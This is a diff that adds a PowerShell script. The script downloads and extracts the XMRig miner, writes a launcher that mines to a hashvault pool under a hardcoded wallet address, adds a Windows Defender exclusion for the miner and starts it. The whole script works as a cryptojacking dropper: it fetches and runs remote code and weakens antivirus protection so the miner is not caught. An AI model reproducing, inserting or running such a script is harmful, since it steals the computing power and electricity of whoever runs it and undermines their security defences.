@@ -1,0 +1,21 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$client = New-Object System.Net.WebClient
+$fileUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
+$downloadPath = "$env:USERPROFILE\Desktop\xmrig-6.21.0-gcc-win64.zip"
+$client.DownloadFile($fileUrl, $downloadPath)
+$extractPath = "$env:USERPROFILE\Desktop\xmrig-6.21.0"
+Expand-Archive -Path $downloadPath -DestinationPath $extractPath -Force
+Get-ChildItem -Path "$extractPath\xmrig-6.21.0"
+$innerDirectory = "$extractPath\xmrig-6.21.0"
+$xmrigExe = Join-Path -Path $innerDirectory -ChildPath "xmrig.exe"
+$miningOceanCmd = Join-Path -Path $innerDirectory -ChildPath "start.cmd"
+$cmdContent = @"
+@echo off
+cd /d "%~dp0"
+xmrig.exe --url pool.hashvault.pro:80 --user ZEPHYR3NiZHBvf7ndM8S9TMiengVL4JeU6ECFa7HFmrR8Wu7CJtKh3wT3r4TXU9a73EE3QmeebxP2V25ZgcREktVh1Y611Wgd8Y3C --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 
+pause
+"@
+$cmdContent | Set-Content -Path $miningOceanCmd -Force
+Unblock-File -Path $xmrigExe
+Add-MpPreference -ExclusionPath $xmrigExe
+Start-Process -FilePath $miningOceanCmd -WorkingDirectory $innerDirectory
